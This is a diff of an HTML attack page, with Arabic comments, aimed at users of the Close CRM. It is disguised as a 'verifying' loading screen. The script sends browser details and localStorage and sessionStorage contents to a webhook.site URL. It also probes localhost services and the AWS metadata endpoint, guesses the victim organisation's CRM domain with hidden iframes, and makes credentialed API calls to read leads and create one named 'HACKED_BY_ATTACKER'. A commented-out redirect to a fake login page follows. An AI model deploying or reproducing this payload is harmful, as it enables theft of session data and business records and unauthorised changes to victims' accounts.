@@ -1,142 +1,161 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSS Exfiltration</title>
+    <title>Loading...</title>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Please wait, verifying...</h1>
     <script>
         // ============================================================
-        // (1) الدالة الأساسية: إرسال أي بيانات إلى الـ Webhook
+        // (1) دالة الإرسال الأساسية
         // ============================================================
         function send(data) {
             fetch('https://webhook.site/ee71332a-2b9b-468a-bcbc-08d4f97ea1e0?log=' + encodeURIComponent(JSON.stringify(data)));
         }
 
         // ============================================================
-        // (2) معلومات المتصفح الأساسية (زي ما جت قبل كده)
+        // (2) المعلومات الأساسية (Referrer ده اللي هيجبلك رابط الـ CRM)
         // ============================================================
+        // ملحوظة: الفورم (form) بيجيب الـ Referrer أكتر من الرابط العادي
+        let ref = document.referrer || 'None (direct or no-referrer)';
         send({
-            ref: document.referrer || 'None',
-            opener: window.opener ? 'Exists' : 'None',
+            type: 'basics',
+            referrer: ref,
+            url: window.location.href,
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            ua: navigator.userAgent,
-            url: window.location.href
+            language: navigator.language,
+            userAgent: navigator.userAgent,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            platform: navigator.platform
         });
 
         // ============================================================
-        // (3) محاولة تخمين نطاق الـ CRM عن طريق تحميل iframes
+        // (3) محاولة فتح نافذة (Pop-up) للـ CRM نفسه (لخطف الجلسة)
         // ============================================================
-        let domains = [
-            'https://victimorg11.closecrm.com',
-            'https://victim-org11.closecrm.com',
-            'https://app.close.com',
-            'https://victimorg11.close.com',
-            'https://victim-org11.close.com'
+        // لو الضحية فتح الرابط من جوه الـ CRM، ممكن نفتح تاب جديد لنفس النطاق
+        // ونحاول نقرأ بياناته (لكن غالباً CORS هيمنع، لكن نجرب)
+        if (ref && ref.startsWith('http')) {
+            try {
+                let win = window.open(ref, '_blank');
+                // هنحاول بعد ثانية نقرأ عنوان التاب الجديد (لو كان نفس النطاق)
+                setTimeout(() => {
+                    try {
+                        if (win && win.location) {
+                            send({ popup_location: win.location.href });
+                        }
+                    } catch (e) {
+                        send({ popup_error: 'CORS or blocked: ' + e.message });
+                    }
+                }, 2000);
+            } catch (e) {
+                send({ popup_exception: e.message });
+            }
+        }
+
+        // ============================================================
+        // (4) Browser SSRF: محاولة استكشاف الشبكة الداخلية
+        // ============================================================
+        // هنحاول نطلب localhost عشان نشوف لو في خدمات داخليه (زي قاعدة بيانات أو Admin)
+        let internalTargets = [
+            'http://127.0.0.1:8080/',
+            'http://127.0.0.1:5000/',
+            'http://localhost/',
+            'http://169.254.169.254/latest/meta-data/'  // AWS Metadata (ده لو السيرفر في AWS)
         ];
 
+        internalTargets.forEach(target => {
+            fetch(target, {
+                mode: 'no-cors'  // عشان نمنع ظهور error CORS ونضمن إن الطلب راح
+            }).then(() => {
+                // لو الطلب وصل (حتى لو مفيش رد)، ده دليل إن الخدمة شغالة
+                send({ ssrf_attempt: target, status: 'Request sent (no-cors mode)' });
+            }).catch(e => {
+                // الخطأ ده هيقولنا لو الخدمة مش موجودة
+                send({ ssrf_attempt: target, error: e.message });
+            });
+        });
+
+        // ============================================================
+        // (5) محاولة تخمين نطاق الـ CRM باستخدام iframe
+        // ============================================================
+        let domains = [
+            'https://app.close.com',
+            'https://victimorg11.closecrm.com',
+            'https://victim-org11.closecrm.com'
+        ];
         domains.forEach(domain => {
             let iframe = document.createElement('iframe');
             iframe.src = domain;
             iframe.style.display = 'none';
             document.body.appendChild(iframe);
-            // نسجل المحاولة
-            send({ attempted_domain: domain });
+            // نرجّع رسالة إننا حاولنا
+            send({ iframe_loaded: domain });
         });
 
         // ============================================================
-        // (4) الهجوم الأساسي: استدعاء API الـ Close مباشرة
+        // (6) محاولة سرقة الـ LocalStorage و SessionStorage
         // ============================================================
-        // حاول تجيب الـ Leads من API Close (حتى لو منع CORS، الكوكيز هتروح مع الطلب)
+        let localData = {};
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i);
+                localData[key] = localStorage.getItem(key);
+            }
+        } catch (e) { localData = { error: e.message }; }
+        send({ localStorage: localData });
+
+        let sessionData = {};
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                let key = sessionStorage.key(i);
+                sessionData[key] = sessionStorage.getItem(key);
+            }
+        } catch (e) { sessionData = { error: e.message }; }
+        send({ sessionStorage: sessionData });
+
+        // ============================================================
+        // (7) محاولة استدعاء API الـ Close (CSRF)
+        // ============================================================
+        // بنحاول نجيب الـ Leads
         fetch('https://api.close.com/api/v1/lead/', {
-            credentials: 'include'  // يرسل كوكيز الجلسة الخاصة بالـ CRM
-        })
-        .then(r => r.text())
-        .then(data => {
-            send({ api_response: data });
-        })
-        .catch(e => {
-            // لو فشل بسبب CORS، الطلب نفسه اتبعت على الأقل
+            credentials: 'include'
+        }).then(r => r.text()).then(data => {
+            send({ api_response: data.substring(0, 500) });
+        }).catch(e => {
             send({ api_error: e.message });
         });
 
-        // ============================================================
-        // (5) محاولة قراءة الصفحة الرئيسية (Dashboard) من نفس النطاق
-        // ============================================================
-        fetch('/', { credentials: 'include' })
-        .then(r => r.text())
-        .then(html => {
-            send({ homepage_preview: html.substring(0, 300) });
-        })
-        .catch(e => {
-            send({ homepage_error: e.message });
-        });
-
-        // ============================================================
-        // (6) تجربة CSRF: محاولة إضافة "ملاحظة" في الـ CRM (تغيير بيانات)
-        // ============================================================
-        // ده مثال على طلب POST (لو الـ API مش محمي ضد CSRF)
-        // هجرب نضيف ملاحظة باسم "XSS-TEST" عشان نثبت إننا نقدر نعدل بيانات.
+        // بنحاول نضيف Lead جديد (لو الـ CSRF مفتوح)
         fetch('https://api.close.com/api/v1/lead/', {
             method: 'POST',
             credentials: 'include',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                display_name: 'XSS-TEST-LEAD',
+                display_name: 'HACKED_BY_ATTACKER',
                 organization: 'victim_org11'
             })
-        })
-        .then(r => r.text())
-        .then(data => {
-            send({ csrf_post_response: data });
-        })
-        .catch(e => {
+        }).then(r => r.text()).then(data => {
+            send({ csrf_post_response: data.substring(0, 200) });
+        }).catch(e => {
             send({ csrf_post_error: e.message });
         });
 
         // ============================================================
-        // (7) محاولة سرقة التوكنات من الـ LocalStorage (لو موجودة)
+        // (8) إعادة توجيه المستخدم لصفحة مزيفة (Phishing) عشان ناخد الباسوورد
         // ============================================================
-        let storage = {};
-        try {
-            for (let i = 0; i < localStorage.length; i++) {
-                let key = localStorage.key(i);
-                storage[key] = localStorage.getItem(key);
-            }
-        } catch (e) {
-            storage = { error: e.message };
-        }
-        send({ localStorage: storage });
+        // بعد ما يجمع كل حاجة، هنوديه لصفحة تسجيل دخول مزيفة
+        // ممكن تعمل صفحة تسجيل دخول على نفس الموقع وتحطها في `login.html`
+        // لكن دلوقتي هنوديه لـ Google عشان متعرفش إنه تحت اختبار
+        // setTimeout(() => {
+        //     window.location = 'https://ozerocool.github.io/login.html';
+        // }, 3000);
 
-        // ============================================================
-        // (8) محاولة سرقة التوكنات من الـ SessionStorage
-        // ============================================================
-        let session = {};
-        try {
-            for (let i = 0; i < sessionStorage.length; i++) {
-                let key = sessionStorage.key(i);
-                session[key] = sessionStorage.getItem(key);
-            }
-        } catch (e) {
-            session = { error: e.message };
+        // خلينا نوديه لـ Close CRM نفسه عشان مياخدش باله
+        if (ref && ref.startsWith('http')) {
+            setTimeout(() => {
+                window.location = ref; // نرجعه تاني للـ CRM
+            }, 4000);
         }
-        send({ sessionStorage: session });
-
-        // ============================================================
-        // (9) محاولة تحميل صورة من النطاق الداخلي (لتأكيد النطاق)
-        // ============================================================
-        // هجرب نحمل صورة من نطاق الـ CRM نفسه (لو وجد) عشان نعرف النطاق الحقيقي
-        let img = new Image();
-        img.src = '/favicon.ico';  // ملف موجود في معظم المواقع
-        img.onerror = function() {
-            send({ favicon_error: 'Failed to load favicon from root' });
-        };
-        img.onload = function() {
-            send({ favicon_success: 'Favicon loaded successfully from root' });
-        };
-        document.body.appendChild(img);
     </script>
 </body>
 </html>
